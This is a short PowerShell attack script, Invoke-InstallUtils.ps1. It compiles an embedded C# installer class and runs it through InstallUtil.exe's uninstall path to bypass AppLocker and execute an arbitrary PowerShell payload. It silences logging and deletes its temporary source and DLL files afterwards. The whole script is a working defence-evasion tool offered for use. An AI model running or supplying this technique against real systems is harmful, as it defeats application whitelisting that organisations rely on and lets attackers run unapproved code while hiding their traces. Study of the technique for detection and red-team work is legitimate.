<#
.SYNOPSIS
    This function uses InstallUtil.exe to run a custom C# binary to bypass AppLocker and execute a PowerShell payload.
.DESCRIPTION
    This function uses InstallUtil.exe to run a custom C# binary to bypass AppLocker and execute a PowerShell payload.
.PARAMETER Command
    This parameter will allow you to specify a command to run.
.EXAMPLE
    .\Invoke-InstallUtils.ps1 -Command "C:\Temp\payload.exe"
#>

#--------[Declarations]--------#
[CmdletBinding()]
Param (
    [Parameter(Mandatory=$false)]
    [String]$Command
)

$cs = New-TemporaryFile;
$dll = New-TemporaryFile;

Set-Content -Path $cs -Value @"
using System;
    using System.Management.Automation;
    using System.Management.Automation.Runspaces;
    using System.Runtime.InteropServices;

    namespace InstallUtilsPwsh
    {
        class Program
        {
            static void Main(string[] args)
            {
                Console.WriteLine("These aren't the droids you're looking for.");
            }
        }

        [System.ComponentModel.RunInstaller(true)]
        public class Sample : System.Configuration.Install.Installer
        {
            public override void Uninstall(System.Collections.IDictionary savedState)
            {
                #region create runspaces
                Runspace runspace = RunspaceFactory.CreateRunspace();
                runspace.Open();
                PowerShell powershell = PowerShell.Create();
                powershell.Runspace = runspace;
                #endregion

                #region execute payload
                powershell.AddScript(@"$Command");
                powershell.Invoke();
                #endregion
            }
        }
    }
"@; 

#--------[Execution]--------#
$libr = (Get-ChildItem -Filter System.Management.Automation.dll -Path c:\Windows\assembly\GAC_MSIL\System.Management.Automation\ -Recurse -ErrorAction SilentlyContinue).FullName
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library /out:$dll $cs /reference:$libr | Out-Null
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U $dll | Out-Null

Remove-Item $cs
Remove-Item $dll